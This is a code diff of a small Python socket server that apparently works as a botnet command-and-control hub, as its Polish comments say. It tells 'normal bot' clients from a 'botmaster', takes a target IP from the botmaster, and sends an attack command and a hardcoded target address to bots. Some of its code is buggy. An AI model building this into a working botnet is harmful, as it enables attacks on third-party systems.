@@ -6,38 +6,32 @@ import threading
 
 from threading import Thread
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
 # połączyć z c&c
-# do każdego połączenia inne ip
+# do każdego ataku inne ip
 # wysłać komunikat o rozpoczęciu ataku
 
 
 print_lock = threading.Lock()
 
 
-def thread_for_botmaster(c):
+# lauch when botmaster is connected
+def thread_for_botmaster(c, addr):
     print('Botmaster Connected')
+    ip = str(c.recv(16).decode())
+    print('received target ip=' + ip)
 
 
 # thread function
 def threaded(c, addr):
     while True:
         # data received from client
-
-        c.send('11'.encode())
-        time.sleep(0.5)
-        c.send('192.168.100.8'.encode())
-        #
-
-        # reverse the given string from client
-        # data = c.recv(1024)
-        # print('data' + repr(data))
-        # data = data[::-1]
-
-        # send back reversed string to client
-        #c.send(data)
+        try:
+            c.send('1'.encode())
+            time.sleep(0.5)
+            c.send('192.168.100.8'.encode())
+        except:
+            print("Bot is disconnected")
+            c.close()
 
         # connection closed
         if not data:
@@ -49,18 +43,9 @@ def threaded(c, addr):
     c.close()
 
 
-
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
 
-    HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
-    PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
-
     host = "127.0.0.1"
-
-    # reverse a port on your computer
-    # in our case it is 12345 but it
-    # can be anything
     port = 65432
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
@@ -69,23 +54,32 @@ if __name__ == '__main__':
     # put the socket into listening mode
     s.listen(5)
     print("socket is listening")
-
+    f=0
     # a forever loop until client wants to exit
     while True:
         # establish connection with client
         c, addr = s.accept()
-        data = c.recv(1024)
-        if int(data.decode())==1:
+        data = c.recv(1).decode()
+        print('otrzymano:'+data)
+        if int(data) == 1:
             print('normal bot connected')
-        if int(data.decode())==2:
+            f = 1
+        if int(data) == 2:
             print('botmaster connected')
-            #start thread for botmaster
+            f = 2
+        # else:
+        #     f = 0
+        #     print("error")
+        #     continue
 
         # lock acquired by client
         print_lock.acquire()
         print('Connected to :', addr[0], ':', addr[1])
 
         # Start a new thread and return its identifier
-        start_new_thread(threaded, (c, addr))
+        if f == 1:
+            th = start_new_thread(threaded, (c, addr))
+        elif f == 2:
+            start_new_thread(thread_for_botmaster, (c, addr))
 
     s.close()
